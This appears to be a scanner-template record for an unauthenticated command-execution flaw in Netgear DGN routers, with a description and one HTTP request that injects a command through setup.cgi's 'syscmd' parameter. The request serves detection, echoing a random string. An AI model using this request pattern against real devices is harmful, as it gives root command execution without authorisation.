# Vulnerability: Netgear DGN Devices - Command Execution
**Classification:** RCE
**Source:** Nuclei Template (`netgear-dgn-rce.yaml`)

## Description
This template checks for unauthenticated command execution vulnerability in Netgear DGN devices. Attackers can bypass authentication mechanisms and execute arbitrary commands with root privileges.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=echo%20{{randstr}}&curpath=/&currentsetting.htm=1
```

